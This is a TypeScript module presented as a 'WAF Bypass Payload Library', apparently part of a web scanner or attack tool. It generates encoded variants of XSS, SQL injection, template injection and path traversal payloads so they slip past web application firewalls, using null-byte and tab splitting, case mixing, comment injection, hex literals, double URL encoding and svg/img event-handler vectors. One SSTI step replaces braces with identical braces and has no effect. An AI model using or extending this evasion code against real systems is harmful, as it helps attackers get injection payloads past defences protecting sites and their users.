/**
 * WAF Bypass Payload Library
 *
 * Provides encoding variants for every major vulnerability class.
 * Modules call `wafVariants(payload, type)` to get a list of encoded
 * versions to try when a raw payload is blocked (WAF-bypass mode).
 */

export type PayloadType = "xss" | "sqli" | "ssti" | "path" | "generic";

/**
 * Returns up to `limit` encoding variants of `payload` for the given type.
 * Always starts with the raw payload so the fast path is tried first.
 */
export function wafVariants(payload: string, type: PayloadType, limit = 6): string[] {
  const variants: string[] = [payload];

  // ── URL encoding ──────────────────────────────────────────────────────────
  const urlEnc = encodeURIComponent(payload);
  if (urlEnc !== payload) variants.push(urlEnc);

  // Double URL encode
  const doubleEnc = encodeURIComponent(urlEnc);
  if (doubleEnc !== urlEnc) variants.push(doubleEnc);

  if (type === "xss") {
    // Unicode normalization: < → ＜, > → ＞
    variants.push(payload.replace(/</g, "＜").replace(/>/g, "＞"));
    // HTML entity encoding: < → &lt;
    variants.push(payload.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;"));
    // Null byte insertion (bypasses some naive blacklists)
    variants.push(payload.replace(/<script/gi, "<scr\x00ipt"));
    // Tab/newline in tag
    variants.push(payload.replace(/<script/gi, "<scr\tipt"));
    // Capital letters variation
    variants.push(payload.replace(/<script/gi, "<ScRiPt").replace(/<\/script>/gi, "</ScRiPt>"));
    // svg/img alternative vectors
    variants.push(`<svg onload="${payload.match(/alert\([^)]+\)/)?.[0] ?? "alert(1)"}">`);
    variants.push(`<img src=x onerror="${payload.match(/alert\([^)]+\)/)?.[0] ?? "alert(1)"}">`);
  }

  if (type === "sqli") {
    // Comment injection: OR → O/**/R
    variants.push(payload.replace(/\bOR\b/gi, "O/**/R").replace(/\bAND\b/gi, "A/**/ND"));
    // Case variation
    variants.push(payload.toUpperCase());
    variants.push(payload.toLowerCase());
    // Hex encoding of string literals
    variants.push(payload.replace(/'([^']*)'/g, (_, s) => "0x" + Buffer.from(s).toString("hex")));
    // Space → tab bypass
    variants.push(payload.replace(/ /g, "\t"));
    // Space → /**/ bypass
    variants.push(payload.replace(/ /g, "/**/"));
    // URL-encoded spaces
    variants.push(payload.replace(/ /g, "%20"));
    // Line break bypass
    variants.push(payload.replace(/ /g, "\n"));
  }

  if (type === "ssti") {
    // URL encode the entire payload
    variants.push(encodeURIComponent(payload));
    // Double-curly with whitespace inside
    variants.push(payload.replace(/\{\{/g, "{ {").replace(/\}\}/g, "} }"));
    // Unicode alternatives for {{ }}
    variants.push(payload.replace(/\{/g, "{").replace(/\}/g, "}"));
  }

  if (type === "path") {
    // Mixed slash encodings
    variants.push(payload.replace(/\.\.\//g, "..%2F"));
    variants.push(payload.replace(/\.\.\//g, "%2e%2e%2f"));
    variants.push(payload.replace(/\.\.\//g, "..%252F")); // double-encoded
    variants.push(payload.replace(/\.\.\//g, "....//"));   // double-dot extra
    variants.push(payload.replace(/\.\.\//g, "%2e%2e/"));
    variants.push(payload.replace(/\//g, "\\"));
  }

  // Deduplicate while preserving insertion order
  const seen = new Set<string>();
  const deduped: string[] = [];
  for (const v of variants) {
    if (!seen.has(v)) { seen.add(v); deduped.push(v); }
  }

  return deduped.slice(0, limit);
}
